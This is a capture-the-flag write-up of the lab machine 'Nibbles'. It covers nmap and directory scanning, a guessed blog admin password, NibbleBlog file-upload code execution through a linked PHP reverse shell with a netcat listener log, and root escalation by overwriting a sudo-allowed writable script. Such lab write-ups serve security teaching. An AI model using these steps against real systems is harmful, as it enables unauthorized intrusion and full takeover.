# Nibbles - 10.10.10.75

## nmap scan

```
# Nmap 7.70 scan initiated Fri May 18 12:39:49 2018 as: nmap -sC -sV -oA nmap 10.10.10.75
Nmap scan report for 10.10.10.75
Host is up (0.11s latency).
Scanned at 2018-05-18 12:39:50 EDT for 17s
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 18 12:40:07 2018 -- 1 IP address (1 host up) scanned in 17.67 seconds
```

## nibbles blog

The initial durbuster did not discover any directories, however Burp discovered ```nibbleblog``` directory, so I started mapping from there.

In fact, durb discovered a lot of stuff.
```
---- Scanning URL: http://10.10.10.75/nibbleblog/ ----
==> DIRECTORY: http://10.10.10.75/nibbleblog/admin/                          
+ http://10.10.10.75/nibbleblog/admin.php (CODE:200|SIZE:1401)                 
==> DIRECTORY: http://10.10.10.75/nibbleblog/content/                        
+ http://10.10.10.75/nibbleblog/index.php (CODE:200|SIZE:4725)                 
==> DIRECTORY: http://10.10.10.75/nibbleblog/languages/                      
==> DIRECTORY: http://10.10.10.75/nibbleblog/plugins/                        
+ http://10.10.10.75/nibbleblog/README (CODE:200|SIZE:4628)                    
==> DIRECTORY: http://10.10.10.75/nibbleblog/themes/                           

---- Entering directory: http://10.10.10.75/nibbleblog/admin/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.75/nibbleblog/content/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.75/nibbleblog/languages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.75/nibbleblog/plugins/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.75/nibbleblog/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
```

The problem was that enum turned out to be useless and it did not seem that it is possible to get a shell without authenticating to the blog. Just before I was going to start sqlmapping and bruteforcing the login page, I decided to try a few stupid guesses. ```admin:nibbles``` got me in.

## RCE

There is a plugin that allows arbitrary file upload.
- [CVE](https://nvd.nist.gov/vuln/detail/CVE-2015-6967)
- [POC](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html)
- [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

```
nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.10.15.147] from (UNKNOWN) [10.10.10.75] 41178
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 15:10:16 up 1 min,  0 users,  load average: 0.25, 0.14, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
```

## Privesc

From there it was really straightforward.

```sudo -l```
```
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
```monitor.sh``` happens to be writable by everyone.
```
$ echo "bash" > /home/nibbler/personal/stuff/monitor.sh
$ sudo /home/nibbler/personal/stuff/monitor.sh
whoami
root
```
